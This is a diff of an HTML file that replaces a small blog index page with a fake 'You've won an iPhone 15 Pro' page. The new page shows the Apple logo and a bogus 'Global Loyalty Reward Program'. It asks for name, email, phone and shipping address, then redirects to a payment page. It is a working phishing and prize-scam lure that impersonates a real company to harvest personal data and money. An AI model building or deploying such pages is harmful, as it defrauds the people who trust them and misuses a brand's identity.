@@ -1,56 +1,87 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Truews</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
-  <header>
-    <h1>My News & Blog Site</h1>
-    <p>Truth seeps,I tell.</p>
-  </header>
-
-  <main id="blog-list">
-    <p>Loading posts...</p>
-  </main>
-
-  <footer>
-    <p>© 2025 My Blog</p>
-  </footer>
-
-  <script>
-    const files = [
-      "posts/post1.json"
-    ];
-
-    async function loadPosts() {
-      const container = document.getElementById("blog-list");
-      container.innerHTML = ""; // Clear loading message
-
-      for (const file of files) {
-        try {
-          const res = await fetch(file);
-          const post = await res.json();
-
-          const postElement = document.createElement("div");
-          postElement.className = "post";
-
-          postElement.innerHTML = `
-            <h2><a href="post.html?src=${encodeURIComponent(file)}">${post.title}</a></h2>
-            <p class="meta">By ${post.author} on ${post.date}</p>
-            <p>${post.content.substring(0, 150)}... <a href="post.html?src=${encodeURIComponent(file)}">Read more</a></p>
-          `;
-
-          container.appendChild(postElement);
-        } catch (err) {
-          console.error("Error loading:", file, err);
-        }
-      }
+  <meta charset="UTF-8">
+  <title>Claim Your iPhone 15 Pro</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #ffffff, #f0f0f0);
+      margin: 0;
+      padding: 0;
+      text-align: center;
     }
 
-    loadPosts();
+    .container {
+      max-width: 600px;
+      margin: 100px auto;
+      padding: 40px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      color: green;
+    }
+
+    img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 12px;
+      font-size: 16px;
+      background-color: green;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 50px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
+    <h1>🎉 You’ve Been Selected!</h1>
+    <p>You've won an iPhone 15 Pro as part of our <strong>Global Loyalty Reward Program</strong>.<br>
+      Enter your details to claim your prize.</p>
+    <form onsubmit="handleSubmit(event)">
+      <input type="text" placeholder="Full Name" required>
+      <input type="email" placeholder="Email Address" required>
+      <input type="tel" placeholder="Phone Number" required>
+      <input type="text" placeholder="Shipping Address" required>
+      <button type="submit">Claim Now</button>
+    </form>
+    <div class="footer">
+      © 2025 ApplePrize Corp. All rights reserved. | Privacy | Terms
+    </div>
+  </div>
+
+  <script>
+    function handleSubmit(e) {
+      e.preventDefault();
+      window.location.href = "Payment.html";
+    }
   </script>
 </body>
 </html>
